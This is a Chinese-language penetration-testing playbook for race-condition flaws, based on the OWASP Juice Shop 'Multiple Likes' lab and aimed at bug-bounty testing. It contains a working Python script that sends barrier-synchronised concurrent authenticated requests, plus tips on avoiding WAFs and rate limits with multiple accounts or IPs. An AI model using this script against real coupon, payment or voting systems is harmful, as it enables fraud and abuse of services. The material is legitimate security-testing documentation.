---
name: race-condition
category: race-condition
source: 渗透/juice-shop-closeout/patterns/race-condition.md
verified_in: [juice-shop-054-multiple-likes]
src_value: medium
severity_ceiling: medium
requires_auth: true
payload_count: 1
---

# 竞态条件验证剧本

> 来源：OWASP Juice Shop 实战（Multiple Likes，id=54）。核心原理：服务器检查-更新操作非原子，并发绕过限制。

## 1. 识别

- 找「有限次数/额度」类业务操作：
  - 点赞/评论/投票（一人一票）
  - 优惠券/积分/红包领取（一次一份）
  - 库存扣减/秒杀下单（一件一单）
  - 转账/余额操作（金额校验）
- 特征：接口有"先检查后更新"逻辑（如先查是否已点赞，再写入）

## 2. Payload 序列

```python
# 并发利用骨架（靶场已验证：15 线程 Barrier 同步）
import threading, requests

BASE = "https://target.example.com"
barrier = threading.Barrier(15)
results = []

def like_review(review_id, token):
    barrier.wait()  # 所有线程同时释放 → 同时到达服务端
    r = requests.post(f"{BASE}/rest/products/1/reviews",
        json={"message": "like", "author": review_id},
        headers={"Authorization": f"Bearer {token}"})
    results.append(r.status_code)

threads = [threading.Thread(target=like_review, args=(rid, token)) for _ in range(15)]
for t in threads: t.start()
for t in threads: t.join()
```

### 关键技巧

- **Barrier 同步**：不用 `time.sleep` 模拟并发，用 `threading.Barrier(N)` 让所有请求同时发出
- 线程数：5-20 之间调整（太少可能全串行、太多可能被 WAF 拦）
- 若单接口有速率限制，可尝试多账号/多 IP 并行

## 3. 判定标准

confirmed 需同时满足：
- [ ] 并发请求数 > 业务限制次数（如 15 次并发点赞全部成功）
- [ ] 服务端实际接受了超额操作（重复点赞计数 > 1、库存扣成负数等）
- [ ] 串行请求同样操作时被拒绝（证明是竞态而非逻辑漏洞）

## 4. 证据要求

按 `evidence-record.md`：
- 并发脚本 + 线程数与结果统计（成功/失败数）
- 串行对照实验（证明非逻辑漏洞）
- 超额操作的业务证据（如数据库计数、页面显示）

## 5. SRC 适用边界

- 适用：有限次数/额度类接口（支付、优惠、库存、投票）
- 不适用：无状态校验接口（每次请求独立无共享状态）
- ⚠️ 注意：并发请求可能触发风控/封号，测试前确认目标无此风险；只做最小超额证明（超 1-2 次即可），不做大规模刷量
